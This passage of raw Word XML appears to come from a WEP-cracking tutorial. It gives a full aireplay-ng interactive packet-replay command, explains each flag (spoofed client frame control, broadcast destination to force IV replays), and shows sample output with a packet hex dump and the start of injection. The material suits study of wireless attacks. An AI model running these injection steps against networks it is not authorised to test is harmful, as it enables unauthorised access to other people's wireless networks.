        <w:t>aireplay</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-2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A5C1B6" w14:textId="77777777" w:rsidR="00954648" w:rsidRDefault="00954648" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D26FBFA" w14:textId="13B4A835" w:rsidR="004652D1" w:rsidRPr="00954648" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9DB11C" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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-2 means use interactive frame selection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA072C9" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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p</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0841 sets the Frame Control Field such that the packet looks like it is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>being sent from a wireless client.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65606D46" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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c</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> FF:FF:FF:FF:FF:FF sets the destination MAC address to be a broadcast. This is required to cause the AP to replay the packet and thus getting the new IV.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4CF19E" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05DE166A" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340E9615" w14:textId="1E487803" w:rsidR="004652D1" w:rsidRPr="00203DFA" w:rsidRDefault="00277615" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>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sidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> defines the interface to use</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D948928" w14:textId="77777777" w:rsidR="00203DFA" w:rsidRDefault="00203DFA" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EA07899"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3F5EAC" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Read 698 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631FC533" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DD11C3" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Size: 86, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 0 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFF56AF" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41AD402E" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2E83FEED" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  FF:FF:FF:FF:FF:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="18D79840" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:D0:CF:03:34:8C</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="21F89409" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52EE" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5853ED5E" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0000:  0842 0000 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0014 6c7e 4080  .B..........l~@.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C60FA8" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0010:  00d0 cf03 348c a0f4 2000 0000 e233 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>962a  ....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>4... ....3.*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17537813" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0020:  90b5 fe67 41e0 9dd5 7271 b8ed ed23 8eda  ...</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>gA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>...#</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="783234C9" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0030:  ef55 d7b0 a56f bc16 355f 8986 a7ab d495  .U...o</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>5_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>......</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="391FF297" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0040:  1daa a308 6a70 4465 9fa6 5467 d588 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>c10c  ....</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>jpDe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Tg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19AA502B" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52E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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0050:  f043 09f6 5418                           .C</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>T.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D235C6" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00AA52EE"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AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C65B097" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="38462014" w14:textId="77777777" w:rsidR="00AA52EE" w:rsidRPr="00AA52EE" w:rsidRDefault="00AA52EE" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44346B85"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sidRPr="00954648">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>You enter “y” to select the packet and start injecting it.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Remember, the smaller the packet, the better. You then start injecting:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0D9EEA" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Saving chosen packet in replay_src-0411-145110.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6796496D" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
